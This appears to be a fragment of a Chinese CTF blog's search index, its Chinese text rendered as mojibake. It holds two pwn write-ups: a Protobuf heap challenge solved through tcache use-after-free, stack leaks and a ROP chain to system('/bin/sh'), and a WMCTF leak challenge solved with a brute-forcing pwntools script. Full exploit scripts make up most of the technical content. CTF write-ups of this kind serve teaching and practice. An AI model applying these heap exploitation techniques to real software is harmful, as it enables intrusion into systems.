‡å‡†è¾“å‡ºå’Œé”™è¯¯\næ¼æ´åˆ©ç”¨ é€šè¿‡é—ç•™çš„unsorted binçš„bkæ¥å¾—åˆ°libcçš„åœ°å€ï¼Œç„¶åé€šè¿‡é‡Šæ”¾ç¬¬ä¸€ä¸ª0x40å¤§å°çš„chunkè¿›å…¥tcacheï¼Œæ‰“å°å‡ºæ¥heapåœ°å€ï¼ŒUAFä¿®æ”¹tcacheçš„fd\nç”³è¯·åˆ°tcache_perthread_struct,å°†environåœ°å€æ·»åŠ åˆ°sizeä¸º0x40çš„tcacheå †å—ä¸Šï¼Œæ³„éœ²å‡ºstackåœ°å€\nä¿®æ”¹rspæŒ‡é’ˆï¼Œåœ¨æ ˆä¸Šæ‰“ORW\nexp 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 from pwn import * import devicemsg_pb2 binary_path = \u0026#39;./pwn\u0026#39; libc_path = \u0026#34;./libc.so.6\u0026#34; context(arch=\u0026#34;amd64\u0026#34;,os=\u0026#34;linux\u0026#34;,log_level=\u0026#34;debug\u0026#34;,terminal = [\u0026#39;tmux\u0026#39;,\u0026#39;splitw\u0026#39;,\u0026#39;-h\u0026#39;]) elf = ELF(binary_path) libc = ELF(libc_path) argv = f\u0026#39;\u0026#39; p=process(argv=[binary_path, argv]) #p=remote(\u0026#39;0.0.0.0\u0026#39;,10002) leak_addr = lambda name,addr: log.success(f\u0026#39;{name}-----\u0026gt;\u0026#39;+hex(addr)) main_arena_offset = libc.symbols[\u0026#34;__malloc_hook\u0026#34;] + 0x10 #global_max_fast_offset = 0x3c67f8 #free_hook_offset = libc.symbols[\u0026#34;__free_hook\u0026#34;] data = devicemsg_pb2.devicemsg() def debug(): gdb.attach(p) pause() def add(idx,content): data.whattodo = 1 data.whatcon = content data.whatidx = idx data.whatsize=0 data.whatsthis=0 p.sendafter(b\u0026#34;WHAT DO YOU WANT?\u0026#34;,data.SerializeToString()) def show(idx): data.whatcon=b\u0026#34;0\u0026#34; data.whattodo=3 data.whatidx=idx data.whatsize=0x20 data.whatsthis=0x20 p.sendafter(\u0026#34;WHAT DO YOU WANT?\u0026#34;,data.SerializeToString()) def dele(idx): data.whatcon=b\u0026#34;B\u0026#34;*0xc0 data.whattodo=2 data.whatidx=idx data.whatsize=0x20 data.whatsthis=0x20 p.sendafter(\u0026#34;WHAT DO YOU WANT?\u0026#34;,data.SerializeToString()) def clean(mem): data.whatcon=mem data.whattodo=0 data.whatidx=0 data.whatsize=0x20 data.whatsthis=0x20 p.sendafter(\u0026#34;WHAT DO YOU WANT?\u0026#34;,data.SerializeToString()) def pwn(): for i in range(9): add(i,b\u0026#34;y4ngy4ng\u0026#34;) show(0) p.recvuntil(b\u0026#34;y4ngy4ng\u0026#34;) libc_addr= u64(p.recv(6).ljust(0x8,b\u0026#34;\\x00\u0026#34;)) - 0x21ace0 leak_addr(\u0026#34;libc_addr\u0026#34;,libc_addr) dele(0) show(0) p.recvuntil(\u0026#34;Content:\u0026#34;) heap_base = (u64(p.recv(5).ljust(0x8,b\u0026#34;\\x00\u0026#34;)) \u0026lt;\u0026lt; 12) - 0x2000 leak_addr(\u0026#34;heap_base\u0026#34;,heap_base) for i in range(6): dele(i+1) dele(7) dele(8) dele(7) for i in range(7): add(i,b\u0026#34;A\u0026#34;*0x8) environ = libc.sym[\u0026#39;environ\u0026#39;] + libc_addr stdout = libc.sym[\u0026#39;_IO_2_1_stdout_\u0026#39;] + libc_addr add(7,p64((heap_base+0xf0) ^((heap_base+0x4e40)\u0026gt;\u0026gt;12))) add(8,b\u0026#34;AAAAAA\u0026#34;) add(8,b\u0026#34;A\u0026#34;) add(8,p64(0)+p64(heap_base+0x10)) #debug() clean((((p16(0)*2+p16(1)+p16(1)).ljust(0x10,b\u0026#34;\\x00\u0026#34;)+p16(1)+p16(1)).ljust(0x90,b\u0026#39;\\x00\u0026#39;)+p64(stdout)+p64(stdout)+p64(0)*5+p64(heap_base+0x10)).ljust(0xe0,b\u0026#34;\\x00\u0026#34;)) #raw_input() clean(p64(0xFBAD1800)+p64(0)*3+p64(environ)+p64(environ+8)) #debug() stack = u64(p.recvuntil(\u0026#34;\\x7f\u0026#34;)[-6:].ljust(0x8,b\u0026#34;\\x00\u0026#34;)) - 0x1a8 + 0x40 - 0x28 leak_addr(\u0026#34;stack\u0026#34;,stack) #raw_input() #debug() clean((((p16(0)*2+p16(0)+p16(0)+p16(1)).ljust(0x10,b\u0026#34;\\x00\u0026#34;)+p16(1)+p16(1)).ljust(0x90,b\u0026#39;\\x00\u0026#39;)+p64(0)+p64(0)+p64(stack)).ljust(0xa0,b\u0026#34;\\x00\u0026#34;)) #raw_input() pop_rdi = 0x000000000002a3e5 + libc_addr system = libc.sym[\u0026#39;system\u0026#39;] + libc_addr binsh = next(libc.search(b\u0026#34;/bin/sh\\x00\u0026#34;)) + libc_addr ret = 0x000000000002a3e6 + libc_addr debug() clean((b\u0026#34;a\u0026#34;*0x28+p64(ret)+p64(pop_rdi)+p64(binsh)+p64(system)).ljust(0x58,b\u0026#34;\\x00\u0026#34;)) p.interactive() if __name__ == \u0026#34;__main__\u0026#34;: pwn() å‚è€ƒ ACT TEAM\n","permalink":"https://www.y4ng.cn/posts/pwn/protobuf/","summary":"æ„Ÿè§‰ä¸å¦‚JSONğŸ¤·â€â™‚ï¸","title":"Protobuf pwn"},{"content":" é¢˜ç›®åˆ†æ ç«Ÿç„¶ç»™äº†æºç 0.0ï¼Œç›´æ¥å¼€çœ‹ï¼ï¼ï¼\nflagä»¥å…¨å±€å˜é‡å­˜åœ¨bssæ®µä¸­\nchecksecä¸€ä¸‹æœç„¶å¼€äº†PIE\u0026hellip;\u0026hellip;.\nç»§ç»­çœ‹æºç ï¼Œå»ºç«‹äº†ä¸€ä¸ªç»“æ„ä½“ï¼Œå¹¶å°†æˆå‘˜åˆ†åˆ«è¾“å‡º\nç»“æ„ä½“å¦‚ä¸‹\n1 2 3 4 typedef struct { char username[32]; char *description; } User; æ¼æ´ç‚¹åœ¨äºç¬¬ä¸€ä¸ªreadè¯­å¥ï¼Œå¯¹usernameçš„è¯»å…¥ä¼šè¦†ç›–æ‰descriptionï¼Œå¯ä»¥æ‰“å¼€pwndbgçœ‹ç»“æ„ä½“åœ¨å†…å­˜ä¸Šçš„åˆ†å¸ƒ\nusernameå 0x20ï¼Œå´å¯ä»¥è¯»å…¥0x28ä¸ªå­—èŠ‚ï¼Œå°†0x55555555c5f0ï¼ˆdescriptionï¼‰ç»™è¦†ç›–ï¼Œä¹‹ååœ¨å°†descriptionç»™è¾“å‡ºæ—¶ï¼Œæœ‰ä¸€ä¸ªä»»æ„å†…å­˜æ³„éœ²\næƒ³åˆ°è¿™ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡æ³„éœ²çš„æ–¹å¼å°†flagç»™è¯»å‡º\næ¼æ´åˆ©ç”¨ ç”±äºå¼€äº†PIEï¼Œä½ä¸‰ä½æ˜¯ä¸å˜çš„ï¼Œå…ˆçœ‹çœ‹flagçš„åœ°å€\nç¬¬ä¸‰ä½æ˜¯0X0C0ï¼Œç”±äºæ²¡æœ‰å†…å­˜ç›´æ¥æŒ‡å‘flagï¼Œå…ˆçœ‹çœ‹å‘¨å›´çš„å†…å­˜ç©ºé—´ï¼Œå‘ç°flagä¸Šé¢æœ‰std_err\nä¸€èˆ¬libcä¸­éƒ½ä¼šæœ‰å†…å­˜æŒ‡å‘std_errï¼Œæ‰€ä»¥åœ¨libcä¸­æœç´¢ä¸€ä¸‹ï¼Œæœç„¶å‘ç°äº†\nç”±äºlibcä¸­åç§»æ˜¯å›ºå®šçš„ï¼Œæ‰€ä»¥ç°åœ¨åªéœ€è¦æ³„éœ²ä¸ªlibcåœ°å€å°±okäº†ï¼Œåœ¨å †é™„è¿‘å¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ªunsorted binï¼Œæ³„éœ²å‡ºå®ƒçš„fdå°±è¡Œäº†\næ€»ç»“ï¼Œæˆ‘ä»¬çš„leakè·¯çº¿å°±æ˜¯unsorted_bin.fd\u0026mdash;\u0026ndash;\u0026gt; stderr\u0026mdash;\u0026mdash;\u0026ndash;\u0026gt;flag\næ³„éœ²FDä¸Šçš„libcæ˜¯1/16çš„å‡ ç‡çˆ†ç ´\nç”±äºè¿œç¨‹åç§»ä¸ä¸€æ ·ï¼Œæˆ‘ä»¬å¼€ä¸€ä¸ªdockerå®¹å™¨å°†é‡Œé¢çš„libcå’Œldç»™æ‹¿å‡ºæ¥\n1 sudo docker run -p 5000:5000 --privileged $(sudo docker build -q .) ä¹‹åå°±æ˜¯è®©äººå´©æºƒçš„åç§»è°ƒè¯•ã€‚ã€‚ã€‚ã€‚æœ€ç»ˆåç§»æ˜¯é€šè¿‡æ³„éœ²å‡ºäº†é™„è¿‘çš„åœ°å€æ‰‹åŠ¨ç¡®å®šçš„\nexp 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 from pwn import * context(os = \u0026#39;linux\u0026#39;,arch = \u0026#39;amd64\u0026#39;,log_level = \u0026#39;debug\u0026#39;,timeout=0.5) binary_path = \u0026#39;./leakleakleak\u0026#39; libc_path = \u0026#39;./libc.so.6\u0026#39; elf = ELF(binary_path) #leak_addr = lambda name,addr: log.success(f\u0026#39;{name}-----\u0026gt;\u0026#39;+hex(addr)) #main_arena_offset = libc.symbols[\u0026#34;__malloc_hook\u0026#34;] + 0x10 def debug(): gdb.attach(p) pause() #\u0026#34;0x7fe8c7a74848\u0026#34; while(True): try: p = remote(\u0026#34;127.0.0.1\u0026#34;, 5000) p.recvuntil(b\u0026#39;What is your name? \u0026#39;) payload = b\u0026#39;a\u0026#39;*32+b\u0026#39;\\x10\\xa7\u0026#39; #debug() p.send(payload) p.recvuntil(b\u0026#39;Let me tell you something about yourself! :3\\n\u0026#39;) addr = u64(p.recvuntil(b\u0026#39;\\x7f\u0026#39;).ljust(8,b\u0026#39;\\x00\u0026#39;)) log.success(\u0026#34;libc---\u0026gt;\u0026#34; + hex(addr)) std_err = addr - 0xe38 p.recvuntil(b\u0026#39;Continue? (Y/n) \u0026#39;) p.sendline(b\u0026#39;Y\u0026#39;) #second p.recvuntil(b\u0026#39;What is your name? \u0026#39;) payload = b\u0026#39;a\u0026#39;*32+p64(std_err) p.send(payload) p.recvuntil(b\u0026#39;Let me tell you something about yourself! :3\\n\u0026#39;) flag_addr = u64(p.recvuntil(b\u0026#39;\\n\u0026#39;,drop=True).ljust(8,b\u0026#39;\\x00\u0026#39;)) + 0x20 log.success(\u0026#34;flag_addr---\u0026gt;\u0026#34;+hex(flag_addr)) p.recvuntil(b\u0026#39;Continue? (Y/n) \u0026#39;) p.sendline(b\u0026#39;Y\u0026#39;) #third log.success(\u0026#34;libc---\u0026gt;\u0026#34; + hex(addr)) log.success(\u0026#34;stderr--\u0026gt;\u0026#34; + hex(std_err)) log.success(\u0026#34;flag_addr---\u0026gt;\u0026#34;+hex(flag_addr)) p.recvuntil(b\u0026#39;What is your name? \u0026#39;) p.send(payload) payload = b\u0026#39;a\u0026#39;*32+p64(flag_addr) p.send(payload) p.interactive() except: p.close() ","permalink":"https://www.y4ng.cn/posts/writeups/wmctf/","summary":"é¢˜ç›®åˆ†æ ç«Ÿç„¶ç»™äº†æºç 0.0ï¼Œç›´æ¥å¼€çœ‹ï¼ï¼ï¼\nflagä»¥å…¨å±€å˜é‡å­˜åœ¨bssæ®µä¸­\nchecksecä¸€ä¸‹æœç„¶å¼€äº†PIE\u0026hellip;\u0026hellip;.\nç»§ç»­çœ‹æºç ï¼Œå»ºç«‹äº†ä¸€ä¸ªç»“æ„ä½“ï¼Œå¹¶å°†æˆå‘˜åˆ†åˆ«è¾“å‡º\nç»“æ„ä½“å¦‚ä¸‹\n1 2 3 4 typedef struct { char username[32]; char *description; } User; æ¼æ´ç‚¹åœ¨äºç¬¬ä¸€ä¸ªreadè¯­å¥ï¼Œå¯¹usernameçš„è¯»å…¥ä¼šè¦†ç›–æ‰descriptionï¼Œå¯ä»¥æ‰“å¼€pwndbgçœ‹ç»“æ„ä½“åœ¨å†…å­˜ä¸Šçš„åˆ†å¸ƒ\nusernameå 0x20ï¼Œå´å¯ä»¥è¯»å…¥0x28ä¸ªå­—èŠ‚ï¼Œå°†0x55555555c5f0ï¼ˆdescriptionï¼‰ç»™è¦†ç›–ï¼Œä¹‹ååœ¨å°†descriptionç»™è¾“å‡ºæ—¶ï¼Œæœ‰ä¸€ä¸ªä»»æ„å†…å­˜æ³„éœ²\næƒ³åˆ°è¿™ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡æ³„éœ²çš„æ–¹å¼å°†flagç»™è¯»å‡º\næ¼æ´åˆ©ç”¨ ç”±äºå¼€äº†PIEï¼Œä½ä¸‰ä½æ˜¯ä¸å˜çš„ï¼Œå…ˆçœ‹çœ‹flagçš„åœ°å€\nç¬¬ä¸‰ä½æ˜¯0X0C0ï¼Œç”±äºæ²¡æœ‰å†…å­˜ç›´æ¥æŒ‡å‘flagï¼Œå…ˆçœ‹çœ‹å‘¨å›´çš„å†…å­˜ç©ºé—´ï¼Œå‘ç°flagä¸Šé¢æœ‰std_err\nä¸€èˆ¬libcä¸­éƒ½ä¼šæœ‰å†…å­˜æŒ‡å‘std_errï¼Œæ‰€ä»¥åœ¨libcä¸­æœç´¢ä¸€ä¸‹ï¼Œæœç„¶å‘ç°äº†\nç”±äºlibcä¸­åç§»æ˜¯å›ºå®šçš„ï¼Œæ‰€ä»¥ç°åœ¨åªéœ€è¦æ³„éœ²ä¸ªlibcåœ°å€å°±okäº†ï¼Œåœ¨å †é™„è¿‘å¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ªunsorted binï¼Œæ³„éœ²å‡ºå®ƒçš„fdå°±è¡Œäº†\næ€»ç»“ï¼Œæˆ‘ä»¬çš„leakè·¯çº¿å°±æ˜¯unsorted_bin.fd\u0026mdash;\u0026ndash;\u0026gt; stderr\u0026mdash;\u0026mdash;\u0026ndash;\u0026gt;flag\næ³„éœ²FDä¸Šçš„libcæ˜¯1/16çš„å‡ ç‡çˆ†ç ´\nç”±äºè¿œç¨‹åç§»ä¸ä¸€æ ·ï¼Œæˆ‘ä»¬å¼€ä¸€ä¸ªdockerå®¹å™¨å°†é‡Œé¢çš„libcå’Œldç»™æ‹¿å‡ºæ¥\n1 sudo docker run -p 5000:5000 --privileged $(sudo docker build -q .) ä¹‹åå°±æ˜¯è®©äººå´©æºƒçš„åç§»è°ƒè¯•ã€‚ã€‚ã€‚ã€‚æœ€ç»ˆåç§»æ˜¯é€šè¿‡æ³„éœ²å‡ºäº†é™„è¿‘çš„åœ°å€æ‰‹åŠ¨ç¡®å®šçš„\nexp 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 from pwn import * context(os = \u0026#39;linux\u0026#39;,arch = \u0026#39;amd64\u0026#39;,log_level = \u0026#39;debug\u0026#39;,timeout=0.","title":"W\u0026MCTF pwn writeups"}]